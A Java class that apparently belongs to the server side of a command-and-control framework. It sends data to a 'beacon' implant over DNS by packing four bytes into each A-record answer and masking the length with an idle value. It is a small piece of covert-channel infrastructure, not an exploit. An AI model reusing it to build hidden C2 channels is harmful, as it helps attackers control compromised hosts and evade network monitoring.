package beacon.dns;

import common.MudgeSanity;
import dns.DNSServer;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;

public class SendConversationA
        extends SendConversation {
    protected DataInputStream readme = null;

    public SendConversationA(String id, String dtype, long mask) {
        super(id, dtype, mask);
    }

    @Override
    public boolean started() {
        return this.readme != null;
    }

    @Override
    public DNSServer.Response start(byte[] data) {
        this.readme = new DataInputStream(new ByteArrayInputStream(data));
        return DNSServer.A((long) data.length ^ this.idlemask);
    }

    @Override
    public DNSServer.Response next() {
        try {
            return DNSServer.A(this.readme.readInt());
        } catch (IOException ioex) {
            MudgeSanity.logException("send, next", ioex, false);
            return DNSServer.A(0L);
        }
    }

    @Override
    public boolean isComplete() {
        try {
            if (this.readme == null) {
                return true;
            }
            if (this.readme.available() == 0) {
                this.readme.close();
                return true;
            }
            return false;
        } catch (IOException ioex) {
            MudgeSanity.logException("isComplete", ioex, false);
            return true;
        }
    }
}

